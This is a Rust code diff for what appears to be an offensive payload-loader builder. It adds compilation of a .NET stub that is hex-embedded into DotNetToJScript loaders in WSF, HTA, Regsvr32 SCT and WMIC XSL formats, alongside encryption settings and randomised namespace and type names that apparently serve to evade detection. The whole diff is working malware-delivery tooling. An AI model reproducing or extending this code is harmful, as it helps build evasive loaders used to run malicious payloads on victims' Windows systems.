@@ -12,9 +12,9 @@ use crate::{
 };
 use template_engine::{
     generate_loader_source, generate_script_source, generate_vba_source,
-    generate_csharp_source, generate_appdomain_config,
+    generate_csharp_source, generate_appdomain_config, generate_wsf_stub_source,
     AppDomainTemplateConfig,
-    Encryption, Feature, LoaderConfig, LoaderType, AppDomainConfig,
+    Encryption, Feature, LoaderConfig, LoaderType, AppDomainConfig, WsfStubConfig,
     OutputCategory,
 };
 
@@ -186,7 +186,19 @@ fn run_build(
         None
     };
 
-    let loader_cfg = LoaderConfig {
+    // DotNetToJScript loaders (WSF/HTA/SCT/WMIC.XSL) all embed a .NET stub
+    let uses_dotnettojscript = matches!(loader_type,
+        LoaderType::Wsf | LoaderType::Hta | LoaderType::Regsvr32Sct | LoaderType::WmicXsl);
+    let wsf_stub_config = if uses_dotnettojscript {
+        Some(WsfStubConfig {
+            namespace: rand_hex_ident(8),
+            type_name: rand_hex_ident(10),
+        })
+    } else {
+        None
+    };
+
+    let mut loader_cfg = LoaderConfig {
         loader_type,
         features,
         encryption,
@@ -195,6 +207,8 @@ fn run_build(
         iv_hex,
         pe_config:        None,
         appdomain_config,
+        wsf_stub_config,
+        dotnet_stub_hex:  None,
     };
 
     jobs.set_status(&job_id, JobStatus::Building { progress: 10, msg: "Generating source...".into() });
@@ -249,6 +263,38 @@ fn run_build(
             }
         }
         OutputCategory::ScriptText => {
+            // Pre-compile .NET stub for all DotNetToJScript loaders
+            if matches!(loader_cfg.loader_type,
+                LoaderType::Wsf | LoaderType::Hta | LoaderType::Regsvr32Sct | LoaderType::WmicXsl) {
+                jobs.set_status(&job_id, JobStatus::Building { progress: 40, msg: "Compiling WSF .NET stub...".into() });
+                match generate_wsf_stub_source(&loader_cfg) {
+                    Ok(stub_cs) => {
+                        let stub_cs_path  = job_dir.join("stub.cs");
+                        let stub_dll_path = job_dir.join("stub.dll");
+                        if std::fs::write(&stub_cs_path, &stub_cs).is_ok() {
+                            match crate::builder::csharp_runner::compile_csharp(
+                                stub_cs_path.to_str().unwrap(),
+                                stub_dll_path.to_str().unwrap(),
+                            ) {
+                                Ok(()) => {
+                                    if let Ok(bytes) = std::fs::read(&stub_dll_path) {
+                                        let hex: String = bytes.iter()
+                                            .map(|b| format!("{:02x}", b))
+                                            .collect();
+                                        loader_cfg.dotnet_stub_hex = Some(hex);
+                                    }
+                                }
+                                Err(e) => {
+                                    error!("WSF stub compile failed (stub will use placeholder): {}", e);
+                                }
+                            }
+                        }
+                    }
+                    Err(e) => {
+                        error!("WSF stub source generation failed: {}", e);
+                    }
+                }
+            }
             jobs.set_status(&job_id, JobStatus::Building { progress: 60, msg: "Rendering script template...".into() });
             let source = match generate_script_source(&loader_cfg) {
                 Ok(s)  => s,
